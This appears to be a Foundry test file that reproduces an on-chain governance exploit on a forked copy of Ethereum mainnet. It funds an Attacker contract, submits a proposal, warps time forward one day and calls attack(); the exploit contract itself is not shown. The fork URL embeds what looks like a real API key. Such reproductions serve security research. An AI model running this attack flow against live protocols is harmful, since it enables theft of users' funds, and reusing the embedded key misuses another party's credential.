// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "../lib/forge-std/src/Test.sol";
import "../src/Attacker.sol";
 
contract AttackerTest is Test {
   function setUp() public {
       vm.createSelectFork('https://eth-mainnet.g.alchemy.com/v2/O_YrXfmF-lYprk8_b4UKRj7dkQLENxbQ', 14595905);
       vm.deal(address(this), 70 ether);
   }
 
   function testAttack() public {
       Attacker attacker = new Attacker();
 
       attacker.proposeBip{value: 70 ether}();
 
       console.log("Proposal created, warping, %", block.timestamp);
       vm.warp(block.timestamp + 1 days);  // travelling 1 day in the future
       console.log("Warped, %s", block.timestamp);
      
       attacker.attack();
   }
}